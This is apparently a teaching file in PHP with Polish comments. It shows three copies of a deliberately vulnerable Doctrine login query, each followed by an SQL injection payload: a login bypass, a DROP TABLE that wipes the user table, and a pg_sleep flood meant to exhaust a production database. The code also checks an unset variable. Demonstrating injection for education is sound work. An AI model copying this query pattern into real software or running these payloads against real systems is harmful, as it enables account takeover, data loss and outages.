<?php

# przyklad 1 - aplikacja podatna na SQL Injection - Stefan, Zlodziej Tozsamosci

$login = $request->getPost('login');
$password = $request->getPost('password');

$query = Doctrine_Query::create()
    ->from('TableWithUsers')
    ->where('login = "' . $login . '"')
    ->andWhere('password = md5("' . $password . '")');

$result = $query->fetchOne(array(), Doctrine::HYDRATE_ARRAY);
if($row == false) {
    throw new Exception('User with this credentials does not exist in database');
}

echo 'Hello, ' . $login;

# przekazujemy zatem następujące dane
# login: Stefan" --
# haslo: UgotujMiBigosNaLaurowymLisciu
# zapytanie przyjmuje postac:
# SELECT * FROM TableWithUsers WHERE login = "Stefan" --" AND password=md5("UgotujMiBigosNaLaurowymLisciu")
# zapytanie zwraca wynik - strona przyjmuje postac:
# Hello, Stefan" --
# a my uzyskujemy dostep do konta Stefana

# ----------------------------------------------------------------------------------------------------------------------
# ----------------------------------------------------------------------------------------------------------------------
# ----------------------------------------------------------------------------------------------------------------------

# przyklad 2 - nieautoryzowane naruszanie zawartosci bazy danych - Stefan, Pan i Wladca Tabel
$login = $request->getPost('login');
$password = $request->getPost('password');

$query = Doctrine_Query::create()
    ->from('TableWithUsers')
    ->where('login = "' . $login . '"')
    ->andWhere('password = md5("' . $password . '")');

$result = $query->fetchOne(array(), Doctrine::HYDRATE_ARRAY);
if($row == false) {
    throw new Exception('User with this credentials does not exist in database');
}

echo 'Hello, ' . $login;

# przekazujemy nastepujace dane
# login: Stefan"; DROP TABLE TableWithUsers; --
# haslo: UgotujMiBigosNaLaurowymLisciu
# zapytanie przyjmuje postac:
# SELECT * FROM TableWithUsers WHERE login = "Stefan"; DROP TABLE TableWithUsers; --" AND password=md5("UgotujMiBigosNaLaurowymLisciu")
# zapytanie zwraca poprawny rezultat wykonania, strona przyjmuje postac:
# Hello, Stefan"; DROP TABLE TableWithUsers; --
# a my uzyskujemy dostep do konta Stefana
# wprawdzie nie na wiele on sie nam zda - tabela uzytkownikow zostala wyczyszczona
# ale za to mamy piekny fakap i blanka :)

# ----------------------------------------------------------------------------------------------------------------------
# ----------------------------------------------------------------------------------------------------------------------
# ----------------------------------------------------------------------------------------------------------------------

# przyklad 3 - atak DDos za posrednictwem bazy - Stefan, Czasowstrzymywacz
$login = $request->getPost('login');
$password = $request->getPost('password');

$query = Doctrine_Query::create()
    ->from('TableWithUsers')
    ->where('login = "' . $login . '"')
    ->andWhere('password = md5("' . $password . '")');

$result = $query->fetchOne(array(), Doctrine::HYDRATE_ARRAY);
if($row == false) {
    throw new Exception('User with this credentials does not exist in database');
}

echo 'Hello, ' . $login;
# przekazujemy nastepujace dane
# login: Stefan"; SELECT pg_sleep(60); --
# haslo: UgotujMiBigosNaLaurowymLisciu
# zapytanie przyjmuje postac:
# SELECT * FROM TableWithUsers WHERE login = "Stefan"; SELECT pg_sleep(60); --" AND password=md5("UgotujMiBigosNaLaurowymLisciu")
# w zaleznosci od konfiguracji serwera:
# - albo dostaniemy blanka (lub komunikat o przekroczonym czasie wykonywania skryptu)
# - albo po 60 sekundach uzyskamy poprawny rezultat i komunikat:
# Hello, Stefan"; SELECT pg_sleep(60); --
# a my uzyskujemy dostep do konta Stefana
#
# teraz odpalmy rownoczesnie 30-50 takich zapytan (lub wiecej) - w pewnym momencie pula zapytan do bazy sie wyczerpie
# a na produkcji dostaniemy slodkiego blanka i cudny fakap